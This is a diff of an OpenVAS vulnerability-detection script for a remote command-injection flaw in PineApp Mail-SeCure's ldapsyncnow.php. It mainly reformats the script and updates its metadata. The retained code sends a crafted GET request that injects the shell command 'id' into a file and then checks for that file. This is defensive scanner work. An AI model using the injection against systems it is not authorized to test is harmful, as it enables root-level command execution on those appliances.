@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_pineapp_mailsecure_61474.nasl 6104 2017-05-11 09:03:48Z teissa $
+# $Id: gb_pineapp_mailsecure_61474.nasl 11056 2018-08-20 13:34:00Z mmartin $
 #
 # PineApp Mail-SeCure 'ldapsyncnow.php' Remote Command Injection Vulnerability
 #
@@ -27,38 +27,39 @@
 
 if (description)
 {
- script_oid("1.3.6.1.4.1.25623.1.0.103758");
- script_bugtraq_id(61474);
- script_version ("$Revision: 6104 $");
- script_tag(name:"cvss_base", value:"10.0");
- script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
+  script_oid("1.3.6.1.4.1.25623.1.0.103758");
+  script_bugtraq_id(61474);
+  script_version("$Revision: 11056 $");
+  script_tag(name:"cvss_base", value:"10.0");
+  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
 
- script_name("PineApp Mail-SeCure 'ldapsyncnow.php' Remote Command Injection Vulnerability");
+  script_name("PineApp Mail-SeCure 'ldapsyncnow.php' Remote Command Injection Vulnerability");
 
- script_xref(name:"URL", value:"http://www.securityfocus.com/bid/61474");
- 
- script_tag(name:"last_modification", value:"$Date: 2017-05-11 11:03:48 +0200 (Thu, 11 May 2017) $");
- script_tag(name:"creation_date", value:"2013-08-13 11:34:56 +0200 (Tue, 13 Aug 2013)");
- script_category(ACT_ATTACK);
- script_family("Web application abuses");
- script_copyright("This script is Copyright (C) 2013 Greenbone Networks GmbH");
- script_dependencies("find_service.nasl", "http_version.nasl");
- script_require_ports("Services/www", 7443);
- script_exclude_keys("Settings/disable_cgi_scanning","PineApp/missing");
+  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/61474");
 
- script_tag(name : "impact" , value : "Successful exploits will result in the execution of arbitrary commands
+  script_tag(name:"last_modification", value:"$Date: 2018-08-20 15:34:00 +0200 (Mon, 20 Aug 2018) $");
+  script_tag(name:"creation_date", value:"2013-08-13 11:34:56 +0200 (Tue, 13 Aug 2013)");
+  script_category(ACT_ATTACK);
+  script_family("Web application abuses");
+  script_copyright("This script is Copyright (C) 2013 Greenbone Networks GmbH");
+  script_dependencies("find_service.nasl", "http_version.nasl");
+  script_require_ports("Services/www", 7443);
+  script_exclude_keys("Settings/disable_cgi_scanning", "PineApp/missing");
+
+  script_tag(name:"impact", value:"Successful exploits will result in the execution of arbitrary commands
  with root privileges in the context of the affected appliance.
  Impact Level: Application");
- script_tag(name : "vuldetect" , value : "Send a crafted HTTP GET request and check the response.");
- script_tag(name : "insight" , value : "The specific flaw exists with input sanitization in the
+  script_tag(name:"vuldetect", value:"Send a crafted HTTP GET request and check the response.");
+  script_tag(name:"insight", value:"The specific flaw exists with input sanitization in the
  ldapsyncnow.php component. This flaw allows for the injection of arbitrary
  commands to the Mail-SeCure server. An attacker could leverage this
  vulnerability to execute arbitrary code as root.");
- script_tag(name : "solution" , value : "Ask the Vendor for an update.");
- script_tag(name : "summary" , value : "PineApp Mail-SeCure is prone to a remote command-injection
+  script_tag(name:"solution", value:"Ask the Vendor for an update.");
+  script_tag(name:"solution_type", value:"VendorFix");
+  script_tag(name:"summary", value:"PineApp Mail-SeCure is prone to a remote command-injection
  vulnerability.");
 
- script_tag(name:"qod_type", value:"remote_app");
+  script_tag(name:"qod_type", value:"remote_app");
 
  exit(0);
 }
@@ -69,7 +70,6 @@ include("misc_func.inc");
 
 port = get_http_port(default:7443);
 
-## Check Host Supports PHP
 if(!can_host_php(port:port)){
   exit(0);
 }
@@ -77,9 +77,9 @@ if(!can_host_php(port:port)){
 resp = http_get_cache(item:"/", port:port);
 
 if("PineApp" >!< resp) {
-  set_kb_item(name:"PineApp/missing", value:TRUE); 
+  set_kb_item(name:"PineApp/missing", value:TRUE);
   exit(0);
-}  
+}
 
 file = 'openvas_' + rand() + '.txt';
 
@@ -87,7 +87,6 @@ file = 'openvas_' + rand() + '.txt';
 req = http_get(item:"/admin/ldapsyncnow.php?sync_now=1&shell_command=id>./" + file + ";", port:port);
 resp = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
 
-# check for existence of the created file
 req = http_get(item:"/admin/" + file, port:port);
 resp = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
 
